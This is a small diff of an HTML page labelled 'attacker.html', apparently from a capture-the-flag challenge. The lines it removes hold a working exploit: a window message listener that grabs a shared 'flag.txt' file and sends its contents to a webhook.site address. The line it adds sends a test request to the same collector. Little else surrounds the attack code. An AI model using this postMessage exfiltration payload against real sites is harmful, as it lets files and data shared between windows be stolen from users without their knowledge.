@@ -1,21 +1,8 @@
 <html>
 
+<!-- attacker.html -->
 <script>
-window.addEventListener("message", async (event) => {
-  if (event.data?.type === "share" && Array.isArray(event.data.files)) {
-    const file = event.data.files.find(f => f.name === "flag.txt");
-
-    if (file && file.blob) {
-      const text = await file.blob.text(); 
-      console.log("FLAG:", text);
-
-  
-fetch("https://webhook.site/e1c8db75-b5b5-47fd-a911-4a02b687c456/collect?flag=" + encodeURIComponent(text), {
-  method: "GET",
-  mode: "no-cors"
-});    }
-  }
-});
+  fetch('https://webhook.site/e1c8db75-b5b5-47fd-a911-4a02b687c456/test?value=123', {mode: "no-cors"});
 </script>
 
 
